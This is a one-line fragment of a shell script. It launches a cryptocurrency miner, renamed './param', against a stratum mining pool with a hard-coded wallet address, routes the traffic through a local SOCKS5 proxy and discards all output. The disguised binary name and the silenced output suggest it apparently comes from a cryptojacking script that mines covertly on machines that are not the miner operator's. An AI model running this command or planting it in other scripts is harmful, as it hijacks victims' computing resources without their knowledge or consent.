...
./param -a minotaurx -o stratum+tcp://fastxyz.teatspray.fun:6000 -u solo:MBqp1j1SARjzcy5ukYdAuriCaFX2hDpNgK@$provider -p x -t $used_num_of_cores --proxy=socks5://127.0.0.1:1082 1>/dev/null 2>&1
